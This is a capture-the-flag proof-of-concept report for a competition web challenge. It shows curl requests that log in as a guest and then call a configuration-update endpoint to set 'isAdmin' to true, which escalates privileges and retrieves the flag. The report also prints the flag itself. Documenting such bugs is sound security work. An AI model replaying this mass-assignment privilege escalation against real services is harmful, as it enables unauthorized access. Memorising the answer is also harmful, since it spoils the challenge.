# Indian Army Terrier Cyber Quest 2026

## Bug Hunting — CTF POC Report

**Challenge:** HEX_09 // CYBER_GATEWAY
**Target:** SQLite Gateway v2.4.1
**Category:** Web / Authentication & Authorization / Configuration Manipulation
**Flag:** `IATCQ{LF6BWCR2VNU0RIFD7CMM5VQBCO}`

### 1. Objective

The objective was to obtain the protected flag from the web application by identifying an authorization/configuration weakness in the challenge environment.

### 2. Initial Observation

The application exposed an authentication portal titled:

> `HEX_09 // CYBER_GATEWAY`

The page identified the backend target as:

> `SQLite Gateway v2.4.1`

The frontend JavaScript showed that authentication was performed through:

```text
POST /api/login
```

with JSON containing `username` and `password`.  

The page also contained the hint:

> `[SEC_OVERRIDE]: Guests are welcome to access the system.` 

### 3. Guest Authentication

A guest account was tested against the login endpoint.

Request:

```bash
curl -sS -c /tmp/web_cj.txt \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}' \
  http://65.1.162.7/api/login
```

Response:

```json
{
  "success": true,
  "message": "Login successful",
  "redirect": "/dashboard.html"
}
```

This confirmed that the guest account could successfully authenticate. 

### 4. Attempt to Access the Flag

After authentication, the flag endpoint was requested:

```bash
curl -sS -b /tmp/web_cj.txt \
  http://65.1.162.7/api/flag
```

The application returned:

```json
{"error":"Access Denied. Global admin privileges required."}
```

Therefore, authentication alone was insufficient; the application required global administrative privileges. 

### 5. Configuration Manipulation

The application exposed an `/api/update` endpoint that accepted a JSON object containing a configuration `path` and `value`.

The following configuration update was performed using the authenticated session:

```bash
curl -sS -b /tmp/web_cj.txt \
  -H "Content-Type: application/json" \
  -d '{"path":"isAdmin","value":true}' \
  http://65.1.162.7/api/update
```

The server responded:

```json
{
  "success": true,
  "message": "Configuration merged successfully."
}
```

This demonstrated that the authenticated guest session could modify the `isAdmin` configuration value. 

### 6. Flag Retrieval

After setting:

```text
isAdmin = true
```

the flag endpoint was accessed again:

```bash
curl -sS -b /tmp/web_cj.txt \
  http://65.1.162.7/api/flag
```

The server returned:

```json
{
  "flag": "IATCQ{LF6BWCR2VNU0RIFD7CMM5VQBCO}"
}
```

This successfully demonstrated access to the protected flag. 

### 7. Vulnerability / Root Cause

The challenge demonstrates an **authorization bypass through insecure configuration merging**.

The intended authorization boundary required:

```text
Global admin privileges
        ↓
/api/flag
        ↓
Flag
```

However, the authenticated guest was able to modify the application's configuration and set:

```text
isAdmin = true
```

which resulted in administrative authorization being granted to the session.

### 8. Impact

An authenticated low-privileged user could modify a security-sensitive authorization property and escalate privileges to an administrative level, resulting in unauthorized access to the protected flag.

**Impact:** Privilege Escalation / Authorization Bypass.

### 9. Evidence

The important evidence is:

1. Guest authentication succeeded. 
2. Initial `/api/flag` request was denied because admin privileges were required. 
3. `/api/update` accepted `isAdmin=true`. 
4. `/api/flag` subsequently returned the flag. 

### 10. Conclusion

The challenge was solved by authenticating as the permitted guest user, identifying the configuration update functionality, modifying the `isAdmin` property to `true`, and subsequently accessing the protected flag endpoint.

**Final Flag:**
`IATCQ{LF6BWCR2VNU0RIFD7CMM5VQBCO}`

---

**POC submission tip:** Google Form में इसे **single PDF/document** में डालो और screenshots को क्रम से लगाओ:

`01_Login → 02_Flag_Denied → 03_Config_Update → 04_Flag_Access`

और एक बात: report में **तुम्हारा CTF login password बिल्कुल मत डालना**।
